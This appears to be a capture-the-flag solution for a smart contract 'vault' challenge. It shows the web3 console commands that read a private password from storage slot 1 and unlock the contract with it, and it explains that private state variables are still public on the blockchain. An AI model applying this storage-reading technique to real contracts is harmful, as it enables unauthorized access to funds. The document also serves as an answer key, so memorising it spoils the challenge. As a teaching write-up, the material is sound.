# In the Console

1. Get the password: `await web3.eth.getStorageAt(contract.address,1)`
2. Unlock the vault: `await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')`

## Why?

Although private state variables are not accessible outside the contract, all state variables are publicly available on the blockchain. Thus, we can get the password data stored in the corresponding storage slot of the contract.
